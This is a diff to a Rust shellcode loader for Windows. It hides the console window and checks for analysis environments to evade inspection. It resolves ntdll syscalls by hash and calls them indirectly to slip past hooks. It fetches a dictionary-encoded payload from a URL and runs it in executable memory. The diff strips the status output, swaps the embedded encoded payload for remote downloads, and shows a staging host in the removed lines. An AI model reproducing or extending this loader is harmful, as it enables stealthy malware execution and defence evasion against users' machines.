@@ -1,10 +1,14 @@
+#![windows_subsystem = "windows"]
+
 use std::collections::HashMap;
 use std::error::Error;
-use std::ptr;
-use std::mem;
 use std::time::{Duration, Instant};
-use std::arch::asm;
-use std::ffi::{CString, c_void};
+
+#[cfg(target_os = "windows")]
+use std::{ptr, mem, arch::asm, ffi::CString};
+
+#[cfg(target_os = "windows")]
+use std::ffi::c_void;
 
 #[allow(non_snake_case)]
 mod win {
@@ -186,6 +190,7 @@ fn hash_function_name(name: &str) -> u32 {
     hash
 }
 
+#[cfg(target_os = "windows")]
 unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo> {
     let ntdll_name = CString::new("ntdll.dll").unwrap();
     let ntdll = win::GetModuleHandleA(ntdll_name.as_ptr());
@@ -249,7 +254,13 @@ unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo> {
     }
 }
 
+#[cfg(not(target_os = "windows"))]
+unsafe fn get_syscall_info(_function_hash: u32) -> Option<SyscallInfo> {
+    None
+}
+
 /// Performs a syscall with 6 parameters (e.g. NtAllocateVirtualMemory)
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn indirect_syscall_6(
     syscall_info: &SyscallInfo,
     a: usize,
@@ -261,7 +272,6 @@ unsafe fn indirect_syscall_6(
 ) -> NTSTATUS {
     let status: NTSTATUS;
     if syscall_info.address != 0 {
-        #[cfg(target_arch = "x86_64")]
         asm!(
             "mov r10, rcx",
             "mov eax, {ssn:e}",
@@ -282,6 +292,7 @@ unsafe fn indirect_syscall_6(
 }
 
 /// Performs a syscall with 5 parameters (e.g. NtProtectVirtualMemory)
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 unsafe fn indirect_syscall_5(
     syscall_info: &SyscallInfo,
     a: usize,
@@ -292,7 +303,6 @@ unsafe fn indirect_syscall_5(
 ) -> NTSTATUS {
     let status: NTSTATUS;
     if syscall_info.address != 0 {
-        #[cfg(target_arch = "x86_64")]
         asm!(
             "mov r10, rcx",
             "mov eax, {ssn:e}",
@@ -312,6 +322,7 @@ unsafe fn indirect_syscall_5(
 }
 
 /// Fallback: Allocates memory using VirtualAlloc
+#[cfg(target_os = "windows")]
 unsafe fn virtual_alloc_ex(size: usize) -> (*mut c_void, bool) {
     let buffer = win::VirtualAlloc(
         ptr::null_mut(),
@@ -322,49 +333,56 @@ unsafe fn virtual_alloc_ex(size: usize) -> (*mut c_void, bool) {
     (buffer, !buffer.is_null())
 }
 
+#[cfg(not(target_os = "windows"))]
+unsafe fn virtual_alloc_ex(_size: usize) -> (*mut std::ffi::c_void, bool) {
+    (std::ptr::null_mut(), false)
+}
+
+#[cfg(target_os = "windows")]
 unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
     let size = shellcode.len();
     let mut buffer: *mut c_void = ptr::null_mut();
-    let mut use_syscall = true;
+    let mut use_syscall = false;
 
-    // Try to allocate memory using indirect syscall
-    let nt_alloc_hash = hash_function_name("NtAllocateVirtualMemory");
-    if let Some(alloc_info) = get_syscall_info(nt_alloc_hash).or_else(|| get_syscall_info(0x12345678)) {
-        let handle: HANDLE = -1;
-        let mut base_address = ptr::null_mut::<c_void>() as usize;
-        let base_address_ptr = &mut base_address as *mut usize;
-        let mut region_size = size;
-        let region_size_ptr = &mut region_size as *mut usize;
-        
-        let allocation_type = (win::MEM_COMMIT | win::MEM_RESERVE) as usize;
-        let protection = win::PAGE_READWRITE as usize;
-        
-        let status = indirect_syscall_6(
-            &alloc_info,
-            handle as usize,
-            base_address_ptr as usize,
-            0usize, // ZeroBits
-            region_size_ptr as usize,
-            allocation_type,
-            protection,
-        );
-        
-        if status != 0 {
-            use_syscall = false;
-        } else {
-            buffer = base_address as *mut c_void;
+    // Try to allocate memory using indirect syscall (only on x86_64)
+    #[cfg(target_arch = "x86_64")]
+    {
+        let nt_alloc_hash = hash_function_name("NtAllocateVirtualMemory");
+        if let Some(alloc_info) = get_syscall_info(nt_alloc_hash).or_else(|| get_syscall_info(0x12345678)) {
+            let handle: HANDLE = -1;
+            let mut base_address = ptr::null_mut::<c_void>() as usize;
+            let base_address_ptr = &mut base_address as *mut usize;
+            let mut region_size = size;
+            let region_size_ptr = &mut region_size as *mut usize;
+            
+            let allocation_type = (win::MEM_COMMIT | win::MEM_RESERVE) as usize;
+            let protection = win::PAGE_READWRITE as usize;
+            
+            let status = indirect_syscall_6(
+                &alloc_info,
+                handle as usize,
+                base_address_ptr as usize,
+                0usize, // ZeroBits
+                region_size_ptr as usize,
+                allocation_type,
+                protection,
+            );
+            
+            if status == 0 {
+                use_syscall = true;
+                buffer = base_address as *mut c_void;
+            }
         }
-    } else {
-        use_syscall = false;
     }
 
-    // Fallback to VirtualAlloc if syscall fails
+    // Fallback to VirtualAlloc if syscall fails or not available
     if !use_syscall || buffer.is_null() {
         let (alloc_buffer, success) = virtual_alloc_ex(size);
         if !success {
             return Err("Memory allocation failed using both syscall and VirtualAlloc".into());
         }
         buffer = alloc_buffer;
+        use_syscall = false;
     }
 
     // Add null check before copying
@@ -377,6 +395,8 @@ unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
 
     // Change memory protection to executable.
     let mut protection_changed = false;
+    
+    #[cfg(target_arch = "x86_64")]
     if use_syscall {
         let nt_protect_hash = hash_function_name("NtProtectVirtualMemory");
         if let Some(protect_info) = get_syscall_info(nt_protect_hash).or_else(|| get_syscall_info(0x87654321)) {
@@ -401,7 +421,7 @@ unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
         }
     }
     
-    // Fallback to VirtualProtect if syscall fails
+    // Fallback to VirtualProtect if syscall fails or not available
     if !protection_changed {
         let mut old_protect = 0u32;
         if win::VirtualProtect(buffer, size, win::PAGE_EXECUTE_READ, &mut old_protect) == 0 {
@@ -428,333 +448,35 @@ fn deobfuscate(bytes: &[u8]) -> String {
     bytes.iter().map(|&b| (b ^ 0x41) as char).collect()
 }
 
-// Embedded Spanish dictionary content
-const EMBEDDED_DICTIONARY: &str = "el
-la
-de
-que
-y
-a
-en
-un
-ser
-se
-no
-haber
-por
-con
-su
-para
-como
-estar
-tener
-le
-lo
-todo
-pero
-mas
-hacer
-o
-poder
-decir
-este
-ir
-otro
-ese
-mi
-bien
-cuando
-quien
-muy
-sin
-vez
-ya
-ver
-porque
-dar
-donde
-si
-tiempo
-mismo
-nada
-deber
-entonces
-tanto
-si
-uno
-ni
-yo
-hasta
-tu
-ahora
-saber
-algo
-querer
-entre
-asi
-bueno
-antes
-nuevo
-desde
-grande
-alla
-cosa
-llamar
-primero
-llegar
-pasar
-mayor
-creer
-dia
-parte
-siempre
-conocer
-ano
-largo
-malo
-todos
-dejar
-mundo
-amigo
-forma
-menos
-igual
-vivir
-lugar
-nunca
-trabajo
-aqui
-pais
-persona
-alto
-caso
-momento
-ciudad
-mujer
-venir
-familia
-agua
-andar
-punto
-seguir
-pequeno
-gente
-tipo
-vida
-sitio
-mano
-volver
-cambiar
-senor
-buscar
-poner
-nombre
-cabeza
-mejor
-ultimo
-contar
-tres
-aquel
-poco
-perder
-mes
-escuchar
-uso
-paso
-medio
-entrar
-fuerte
-grupo
-hijo
-libro
-meses
-lado
-sobre
-manera
-aunque
-servir
-ejemplo
-salir
-pensar
-fuera
-mes
-palabra
-muchos
-jugar
-cerca
-entrar
-volver
-claro
-gustar
-numero
-matar
-clase
-dios
-cuatro
-mostrar
-contra
-crear
-propio
-historia
-llevar
-color
-abrir
-esperar
-vivir
-mirar
-campo
-listo
-hora
-programa
-mover
-esperar
-necesitar
-correr
-comer
-hijo
-tomar
-carro
-perro
-gato
-casa
-ciudad
-rio
-bajo
-cielo
-luz
-arbol
-papel
-viento
-dolar
-carta
-puerta
-fondo
-lejos
-tierra
-isla
-orden
-libre
-causa
-fiesta
-sangre
-valor
-guerra
-fuerza
-muerte
-pueblo
-lleno
-pocos
-miedo
-frente
-grito
-accion
-cuerpo
-boca
-final
-golpe
-peso
-idea
-usar
-llegar
-largo
-viento
-autor
-vista
-calor
-error
-loco
-norte
-dolor
-fruta
-futuro
-mesa
-motor
-nivel
-total
-moda
-joven
-rico
-salud
-mayor
-ritmo
-techo
-canal
-genio
-serie
-radio
-clima
-humor
-metro
-base
-hablar
-dormir
-corazon
-cinco
-dinero
-semana
-amor
-noche
-estar
-blanco
-azul
-rojo
-verde
-negro
-sol
-luna
-playa
-comida
-camino
-banco
-diez
-dos
-cien
-gracias
-adios
-hola
-feliz
-triste
-viejo
-verdad
-mentira";
+// URLs for content retrieval - prioritized source
+// Change URLS to your payload and dictionary URLs
+const DICTIONARY_URL: &str = "http://localhost:5500/rust-run/es-dictionary.txt"; 
+const PAYLOAD_URL: &str = "http://localhost:5500/rust-run/load.txt";
 
-// Embedded encoded payload
-const EMBEDDED_ENCODED_PAYLOAD: &str = "radio pasar paso viento nivel error libre el el el nuevo malo nuevo ano malo pasar entonces fuerza mujer pasar lado malo persona pasar lado malo hacer pasar lado malo mi malo amigo pasar lado cambiar ano parte entonces tierra pasar para tomar creer creer pasar entonces luz mirar querer alto tres de si mi nuevo arbol tierra con nuevo la arbol llegar futuro malo pasar lado malo mi nuevo malo lado desde querer pasar la valor venir escuchar cabeza hacer haber de para fuerte cambiar el el el lado escuchar libro el el el pasar fuerte luz senor familia pasar la valor alla lado antes mi ano lado pasar hacer pasar la valor largo amigo pasar metro tierra nuevo lado uno libro pasar la pocos parte entonces tierra pasar entonces luz mirar nuevo arbol tierra con nuevo la arbol tu idea buscar total dia que dia muy ser cosa ahora guerra buscar frente menos alla lado antes muy pasar la valor venir nuevo lado por pasar alla lado antes este pasar la valor nuevo lado y libro pasar la valor nuevo menos nuevo menos aqui igual lugar nuevo menos nuevo igual nuevo lugar pasar paso fruta mi nuevo malo metro idea menos nuevo igual lugar pasar lado tener loco creer metro metro metro trabajo pasar entonces cuerpo todos pasar bajo nombre andar tipo andar tipo mujer senor el nuevo amigo pasar libro usar pasar fondo papel dia nombre vez un metro lleno todos todos error paso el el el parte vida ultimo andar pequeno pequeno alto nada ni mismo deber mi ver andar ano alto mujer algo mi grande ano mundo mi conocer todos mi entonces hasta pais hasta pais tanto mi pequeno andar seguir mujer mi parte alto momento mi conocer todos mi menos porque mi nuevo sitio sitio pequeno mujer forma mujer caso creer andar senor nada yo deber ni mismo entonces mismo entonces ni mi ver creer pasar dejar parte dia si mi pequeno andar seguir mujer mi primero mujer momento seguir vida porque mi amigo mujer cambiar cambiar andar vida tipo nada entonces hasta mismo uno mismo entonces mi parte vida caso andar pequeno mujer nada entonces ni cosa entonces uno tu mi todos alto venir alto cambiar andar nada yo deber uno mismo entonces el igual todos lugar parte entonces luz parte entonces tierra todos todos pasar gato saber amigo mejor llevar el el el el metro lleno error hacer el el el pequeno andar cambiar senor mujer tipo mismo alto senor senor momento seguir tiempo mujer mujer sitio pequeno vida mejor mismo tipo mujer senor el lugar pasar libro arbol pasar fondo luz casa la el el parte entonces tierra todos todos punto que todos pasar gato forma libro clase puerta el el el el metro lleno error andar el el el nada pasar todos vida entonces ni llamar entonces amigo amigo tipo desde alto nuevo llamar cambiar grande ano venir tu menos pasar malo mano pequeno momento sitio cambiar hasta primero parte alla mundo caso yo ni menos gente mujer malo yo cosa seguir momento ni uno llamar momento pasar nuevo grande llamar mundo deber ni venir dia menos ahora lugar dia ahora deber punto tanto caso desde menos agua agua tu grande malo grande vida alto conocer yo cabeza si forma cambiar buscar menos amigo vida buscar momento menos creer seguir llamar buscar mujer mundo grande primero grande senor buscar mundo alla seguir pequeno el pasar libro arbol todos lugar nuevo menos parte entonces tierra todos pasar carro el tanto color medio el el el el ano todos todos pasar fondo papel dolor mundo mismo algo metro lleno pasar libro puerta punto no pais pasar libro total punto ese lugar malo agua escuchar si el el pasar libro idea punto y nuevo igual pasar gato buscar llamar matar fuerte el el el el metro lleno parte entonces luz todos lugar pasar libro total parte entonces tierra parte entonces tierra todos todos pasar fondo papel tiempo en hacer contar metro lleno fuerte luz buscar ese pasar fondo arbol libro le el el pasar gato alla nivel ni idea el el el el metro lleno pasar metro sangre senor de dolor hora error mundo el el el todos igual punto antes lugar pasar libro guerra arbol llegar como pasar fondo luz el como el el pasar gato menos crear todos autor el el el el metro lleno pasar fuera todos todos pasar libro calor pasar libro total pasar libro accion pasar fondo luz el mi el el pasar libro canal pasar gato tener muchos libro llegar el el el el metro lleno pasar paso dolar mi fuerte luz senor esperar venir lado un pasar la orden fuerte luz buscar fuerza menos orden menos punto el igual pasar fondo papel nivel comer mostrar amigo metro lleno";
 
-// Function to simulate download but use embedded content
-fn get_embedded_content(content_type: &str) -> Result<String, Box<dyn Error>> {
-    match content_type {
-        "dictionary" => Ok(EMBEDDED_DICTIONARY.to_string()),
-        "payload" => Ok(EMBEDDED_ENCODED_PAYLOAD.to_string()),
-        _ => Err("Invalid content type requested".into())
-    }
-}
-
-// Kept for compatibility with the original code flow
+// Enhanced download function that prioritizes URLs from within the executable
 fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
-    // Check if this is a request for dictionary or payload and return embedded content
-    if url.ends_with("es-dictionary.txt") {
-        return get_embedded_content("dictionary");
-    } else if url.ends_with("load.txt") {
-        return get_embedded_content("payload");
-    }
-    
-    // Fallback to actual download for any other URLs (keeping original functionality)
     for attempt in 1..=retries {
         match client.get(url).send() {
             Ok(response) => {
                 if response.status().is_success() {
                     match response.text() {
-                        Ok(text) if !text.is_empty() => return Ok(text),
-                        Ok(_) => {},
+                        Ok(text) if !text.is_empty() => {
+                            return Ok(text);
+                        },
+                        Ok(_) => {
+                            // Empty response - continue to retry
+                        },
                         Err(e) => {
                             if attempt == retries {
                                 return Err(format!("Failed to extract text from response: {}", e).into());
                             }
                         }
                     }
-                } else if attempt == retries {
-                    return Err(format!("Failed with status code: {}", response.status()).into());
+                } else {
+                    if attempt == retries {
+                        return Err(format!("Failed with status code: {}", response.status()).into());
+                    }
                 }
             }
             Err(e) => {
@@ -763,34 +485,28 @@ fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries:
                 }
             }
         }
-        std::thread::sleep(Duration::from_secs(2));
+        if attempt < retries {
+            std::thread::sleep(Duration::from_secs(2));
+        }
     }
     Err(format!("Failed to retrieve {} after {} attempts", url, retries).into())
 }
 
 fn main() -> Result<(), Box<dyn Error>> {
     if detect_analysis_environment() {
-        println!("Analysis environment detected. Exiting...");
         return Ok(());
     }
     
-    println!("[*] Initializing...");
     let client = reqwest::blocking::ClientBuilder::new()
         .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         .timeout(Duration::from_secs(30))
         .connect_timeout(Duration::from_secs(10))
         .build()?;
 
-    // URLs kept for compatibility with the original code flow
-    // The actual content will be sourced from the embedded constants
-    let dict_url = "https://stage.attck-deploy.net/es-dictionary.txt";
-    let load_url = "https://stage.attck-deploy.net/load.txt";
-    
-    println!("[*] Retrieving dictionary...");
-    let dictionary_text = match download_with_retries(&client, dict_url, 3) {
+    // Download dictionary from URL
+    let dictionary_text = match download_with_retries(&client, DICTIONARY_URL, 3) {
         Ok(text) => text,
         Err(e) => {
-            println!("[!] Error retrieving dictionary: {}", e);
             return Err(format!("Dictionary retrieval failed: {}", e).into());
         }
     };
@@ -800,17 +516,12 @@ fn main() -> Result<(), Box<dyn Error>> {
     }
     
     let decoder = Decoder::new(&dictionary_text);
-    println!("[+] Dictionary cached with {} entries", decoder.dictionary.len());
-    if decoder.dictionary.len() != 256 {
-        println!("[!] Warning: Dictionary doesn't contain expected 256 entries (found {})", decoder.dictionary.len());
-    }
     
-    println!("[*] Downloading payload...");
-    let encoded_payload = match download_with_retries(&client, load_url, 3) {
+    // Download payload from URL
+    let encoded_payload = match download_with_retries(&client, PAYLOAD_URL, 3) {
         Ok(text) => text,
         Err(e) => {
-            println!("[!] Error downloading payload: {}", e);
-            return Err(format!("Payload download failed: {}", e).into());
+            return Err(format!("Payload retrieval failed: {}", e).into());
         }
     };
     
@@ -818,22 +529,26 @@ fn main() -> Result<(), Box<dyn Error>> {
         return Err("Retrieved empty payload".into());
     }
 
-    println!("[*] Decoding payload...");
     let shellcode = decoder.decode(&encoded_payload);
-    println!("[+] Payload size: {} bytes", shellcode.len());
     if shellcode.is_empty() {
         return Err("Payload is empty. Check dictionary and encoded content".into());
     }
 
-    println!("[*] Executing payload...");
-    unsafe {
-        match execute_shellcode(&shellcode) {
-            Ok(_) => println!("[+] Execution completed"),
-            Err(e) => {
-                println!("[!] Execution failed: {}", e);
-                return Err(format!("Shellcode execution failed: {}", e).into());
+    #[cfg(target_os = "windows")]
+    {
+        unsafe {
+            match execute_shellcode(&shellcode) {
+                Ok(_) => {},
+                Err(e) => {
+                    return Err(format!("Shellcode execution failed: {}", e).into());
+                }
             }
         }
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    {
+        // Silent operation on non-Windows systems
     }
 
     Ok(())
